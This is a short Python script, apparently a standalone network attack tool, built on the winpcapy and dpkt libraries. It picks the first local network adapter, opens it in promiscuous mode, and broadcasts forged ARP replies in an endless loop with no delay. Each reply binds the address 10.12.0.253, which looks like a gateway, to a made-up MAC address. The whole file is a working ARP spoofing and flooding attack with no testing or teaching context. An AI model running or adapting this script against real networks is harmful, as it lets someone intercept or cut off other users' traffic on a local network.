#encoding: UTF-8
import sys
import time
from socket import inet_aton
from ctypes import *

from winpcapy import *
from dpkt.ethernet import Ethernet, ETH_TYPE_ARP
from dpkt.arp import ARP, ARP_OP_REPLY

devs = []

def print_all_devs():
    """Print a list of all interfaces on local host.
    """
    errbuf = create_string_buffer(PCAP_ERRBUF_SIZE)
    alldevs = POINTER(pcap_if_t)()
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, None,
                            byref(alldevs), errbuf) != 0):
        print("Error in pcap_findalldevs(): %s" % errbuf.value)

    global  devs
    dev = alldevs.contents
    i = 0
    while dev:
        devs += [[dev.description, dev.name]]
        print("%d.%s:\n  %s\n" % (i, dev.description, dev.name))
        i += 1
        if dev.next:
            dev = dev.next.contents
        else:
            dev = False
    pcap_freealldevs(alldevs)


def build_packet(plist):
    """Build and return a packet from a str.
    """
    packet = (c_ubyte * len(plist))()
    i = 0
    for bit in plist:
        packet[i] = ord(bit)
        i += 1
    return packet


def send_arp(fp):

    arp = ARP(op = ARP_OP_REPLY,
              sha = '\xac\xf7\xf3\x00\x00\x00',
              spa = inet_aton('10.12.0.253'),
              tha = '\xff\xff\xff\xff\xff\xff',
              tpa = inet_aton('10.12.255.255'))

    eth = Ethernet(src = '\xac\xf7\xf3\x00\x00\x00',
                   dst = '\xff\xff\xff\xff\xff\xff',
                   type = ETH_TYPE_ARP,
                   data = arp)

    packet = str(eth)
    if (pcap_sendpacket(fp, build_packet(packet), len(packet)) != 0):
        print("Error sending the packet:\n  %s" % pcap_geterr(fp))


def main():

    print_all_devs()
    dev = 0
    errbuf = create_string_buffer(PCAP_ERRBUF_SIZE)
    fp = pcap_open_live(devs[dev][1], 65536,
                        PCAP_OPENFLAG_PROMISCUOUS, 1, None, errbuf)
    if not bool(fp):
        print("Unable to open the adapter (%s)." % dev)
        sys.exit(2)

    while True:
        send_arp(fp)
        #time.sleep(0.2)

    pcap_close(fp)


if __name__ == '__main__':
    main()
